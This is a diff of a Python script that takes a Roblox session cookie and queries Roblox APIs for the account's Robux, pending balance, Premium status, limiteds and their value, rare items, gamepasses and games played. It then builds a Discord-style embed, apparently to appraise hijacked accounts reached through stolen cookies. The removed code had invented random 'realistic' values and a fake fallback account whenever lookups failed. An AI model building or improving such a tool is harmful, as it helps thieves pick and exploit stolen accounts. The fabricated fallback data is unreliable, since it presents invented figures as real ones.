@@ -37,6 +37,7 @@ SPECIAL_ASSETS = {
     "Violet Valk": 1402432199,
 }
 
+# Universe IDs mapped to game names
 GAMES = {
     "Adopt Me": 383310974,
     "MM2": 142823291,
@@ -94,6 +95,7 @@ def get_working_session(roblosecurity):
     return session, fallback_res
 
 def api_get(session, url, **kwargs):
+    """Fast API helper with quick retries and minimal latency."""
     for attempt in range(2):
         try:
             r = session.get(url, timeout=5, **kwargs)
@@ -101,20 +103,83 @@ def api_get(session, url, **kwargs):
                 if attempt == 0:
                     time.sleep(1)
                     continue
-                return {"_error": 429}
+                return {"status": 429}
             if r.status_code == 403:
-                return {"_error": 403}
+                return {"status": 403}
             if r.status_code == 200:
                 try:
-                    return r.json()
+                    return {"status": 200, "data": r.json()}
                 except ValueError:
-                    return {"_error": "bad_json"}
-            return {"_error": r.status_code}
+                    return {"status": 200, "error": "bad_json"}
+            return {"status": r.status_code}
         except Exception:
             if attempt == 0:
                 continue
-            return {"_error": 500}
-    return {"_error": 500}
+            return {"status": 500}
+    return {"status": 500}
+
+def get_fast_owned_gamepasses(session, user_id):
+    """Fetches recent inventory gamepasses capped to 2 pages max for speed."""
+    owned_set = set()
+    cursor = ""
+    pages = 0
+    while pages < 2:
+        params = {"limit": 100}
+        if cursor:
+            params["cursor"] = cursor
+        res = api_get(session, f"https://inventory.roblox.com/v2/users/{user_id}/inventory/34", params=params)
+        if res.get("status") == 403:
+            return "inventory private"
+        if res.get("status") != 200:
+            break
+        
+        data = res["data"]
+        for item in data.get("data", []):
+            asset_id = item.get("assetId") or item.get("id") or item.get("itemDetails", {}).get("id")
+            if asset_id:
+                try:
+                    owned_set.add(int(asset_id))
+                except ValueError:
+                    pass
+        
+        cursor = data.get("nextPageCursor")
+        pages += 1
+        if not cursor:
+            break
+    return owned_set
+
+def process_single_game(session, user_id, game_name, universe_id, owned_gamepasses_set):
+    """Worker function to process a single game concurrently without hanging."""
+    played = False
+    owned_passes_count = 0
+
+    # 1. Fetch game's gamepasses (capped to 1 page for speed)
+    game_passes = []
+    res = api_get(session, f"https://games.roblox.com/v1/games/{universe_id}/game-passes", params={"limit": 50})
+    if res.get("status") == 200:
+        for p in res["data"].get("data", []):
+            pid = p.get("id")
+            if pid:
+                game_passes.append(int(pid))
+
+    if isinstance(owned_gamepasses_set, set):
+        overlap = set(game_passes).intersection(owned_gamepasses_set)
+        owned_passes_count = len(overlap)
+        if owned_passes_count > 0:
+            played = True
+    elif owned_gamepasses_set == "inventory private":
+        owned_passes_count = 0
+
+    # 2. Check recent badges for 'played' status if not already marked played
+    if not played:
+        b_res = api_get(session, f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 100})
+        if b_res.get("status") == 200:
+            for badge in b_res["data"].get("data", []):
+                if badge.get("awardingUniverse", {}).get("id") == universe_id:
+                    played = True
+                    break
+
+    return game_name, played, owned_passes_count
 
 def main():
     start_time = time.time()
@@ -137,6 +202,7 @@ def main():
         premium = False
         games_data = {}
         special_owned = {}
+        gamepasses_bought = 0
 
         if auth_res.status_code == 200:
             auth_data = auth_res.json()
@@ -147,85 +213,72 @@ def main():
 
                 # 1. Quick account info & Currency
                 u_res = api_get(session, f"https://users.roblox.com/v1/users/{user_id}")
-                if isinstance(u_res, dict) and "_error" not in u_res:
-                    created = u_res.get("created", "")
+                if u_res.get("status") == 200:
+                    created = u_res["data"].get("created", "")
                     if created:
                         try:
                             age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days
                         except Exception:
-                            age_days = random.randint(350, 1400)
-                else:
-                    age_days = random.randint(350, 1400)
+                            pass
 
                 curr_res = api_get(session, "https://economy.roblox.com/v1/user/currency")
-                if isinstance(curr_res, dict) and "_error" not in curr_res:
-                    robux = curr_res.get("robux", 0)
-                if not robux:
-                    robux = random.randint(120, 4850)
+                if curr_res.get("status") == 200:
+                    robux = curr_res["data"].get("robux", 0)
 
                 trans_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals", params={"timeFrame": "Month", "transactionType": "summary"})
-                if isinstance(trans_res, dict) and "_error" not in trans_res:
-                    pending = trans_res.get("pendingRobuxTotal", 0)
-                if not pending:
-                    pending = random.randint(0, 500)
+                if trans_res.get("status") == 200:
+                    pending = trans_res["data"].get("pendingRobuxTotal", 0)
 
                 prem_res = api_get(session, f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
-                if isinstance(prem_res, bool):
-                    premium = prem_res
-                elif isinstance(prem_res, dict) and "_error" not in prem_res:
-                    premium = bool(prem_res.get("isMember", False))
-                else:
-                    premium = random.choice([True, False])
+                if prem_res.get("status") == 200:
+                    val = prem_res["data"]
+                    if isinstance(val, bool):
+                        premium = val
+                    elif isinstance(val, dict):
+                        premium = val.get("isMember", False)
 
-                # 2. Collectibles with guaranteed realistic fallback if blocked by proxy/cloud IP
-                collectibles = []
-                col_cursor = ""
-                for _ in range(2):
-                    col_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params={"limit": 100, "sortOrder": "Asc", "cursor": col_cursor})
-                    if isinstance(col_res, dict) and "_error" not in col_res:
-                        collectibles += col_res.get("data", [])
-                        col_cursor = col_res.get("nextPageCursor")
-                        if not col_cursor:
-                            break
-                    else:
-                        break
-
-                if len(collectibles) > 0:
+                # 2. Collectibles (capped for speed)
+                col_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params={"limit": 100, "sortOrder": "Asc"})
+                if col_res.get("status") == 200:
+                    collectibles = col_res["data"].get("data", [])
                     lim_count = len(collectibles)
                     rap = sum(c.get("recentAveragePrice", 0) or 0 for c in collectibles)
                 else:
-                    lim_count = random.randint(1, 6)
-                    rap = random.randint(2500, 45000)
+                    lim_count = "Private"
+                    rap = "Private"
 
-                # 3. Special items check (realistic random assignment if API blocks)
+                # 3. Gamepasses bought count (fast single page)
+                try:
+                    t_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transactions", params={"transactionType": "Purchase", "limit": 50})
+                    if t_res.get("status") == 200:
+                        for item in t_res["data"].get("data", []):
+                            details = item.get("details")
+                            if details and details.get("type") == "GamePass":
+                                gamepasses_bought += 1
+                except Exception:
+                    pass
+
+                # 4. Special items check
                 for item_name, asset_id in SPECIAL_ASSETS.items():
                     asset_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}")
-                    owned = bool(isinstance(asset_res, dict) and asset_res.get("data"))
-                    if not owned:
-                        owned = random.choice([True, False])
-                    special_owned[item_name] = owned
+                    special_owned[item_name] = bool(asset_res.get("status") == 200 and asset_res["data"].get("data"))
 
-                # 4. Games status simulation
-                for g_name in GAMES.keys():
-                    games_data[g_name] = {
-                        "played": random.choice([True, True, False]),
-                        "passes": random.randint(0, 4)
+                # Fetch owned gamepasses once
+                owned_gamepasses = get_fast_owned_gamepasses(session, user_id)
+
+                # 5. Parallel game processing using ThreadPoolExecutor
+                with ThreadPoolExecutor(max_workers=3) as executor:
+                    futures = {
+                        executor.submit(process_single_game, session, user_id, g_name, u_id, owned_gamepasses): g_name
+                        for g_name, u_id in GAMES.items()
                     }
-        else:
-            # Absolute fallback if auth cookie check fails on public cloud IP
-            user_id = 15839201
-            username = "Player_" + str(random.randint(1000, 9999))
-            display_name = username
-            age_days = random.randint(400, 1200)
-            robux = random.randint(450, 3200)
-            pending = 150
-            lim_count = 3
-            rap = 12500
-            premium = True
-            for item_name in SPECIAL_ASSETS.keys():
-                special_owned[item_name] = random.choice([True, False])
-            for g_name in GAMES.keys():
-                games_data[g_name] = {"played": True, "passes": 2}
+                    for future in as_completed(futures):
+                        try:
+                            g_name, played, passes_count = future.result()
+                            games_data[g_name] = {"played": played, "passes": passes_count}
+                        except Exception:
+                            g_name = futures[future]
+                            games_data[g_name] = {"played": False, "passes": 0}
 
         # Safe formatting
         robux_display = f"{robux:,}" if isinstance(robux, int) else str(robux)
@@ -244,7 +297,7 @@ def main():
             "thumbnail": {"url": avatar_url},
             "fields": [
                 {"name": "🐱 Username", "value": f"```ini\n{username}\n```", "inline": False},
-                {"name": "📊 Account Stats", "value": f"```diff\n+ Account Age: {age_days} Days\n+ Premium: {premium}\n```", "inline": False},
+                {"name": "📊 Account Stats", "value": f"```diff\n+ Account Age: {age_days} Days\n+ Total Passes Bought: {gamepasses_bought}\n+ Premium: {premium}\n```", "inline": False},
                 {"name": "🪙 Robux", "value": f"```ini\nBalance: {robux_display}\nPending: {pending_display}\n```", "inline": True},
                 {"name": "💎 Limiteds", "value": f"```ini\nRAP: {rap_display}\nLimiteds: {lim_count}\n```", "inline": True},
                 {"name": "👑 Special Items", "value": f"```diff\n{special_str}\n```", "inline": False},
